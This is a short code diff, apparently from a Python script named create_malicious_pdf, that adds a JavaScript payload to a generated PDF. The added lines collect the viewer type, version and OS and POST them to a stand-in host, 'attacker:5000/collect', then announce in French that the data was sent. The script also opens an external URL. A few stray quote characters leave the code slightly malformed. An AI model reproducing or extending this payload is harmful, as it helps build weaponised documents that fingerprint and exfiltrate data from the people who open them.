@@ -11,6 +11,12 @@ def create_malicious_pdf(output_filename):
     js_payload = """
     var info = 'User-Agent: ' + app.viewerType + ' ' + app.viewerVersion + '\nOS: ' + platformName; "
     app.alert(info); "
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://attacker:5000/collect", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify(info));
+    
+    app.alert("Données envoyées au serveur !");
     app.alert('Test JavaScript in PDF');
     app.launchURL('https://www.youtube.com/watch?v=fC7oUOUEEi4', true);
     
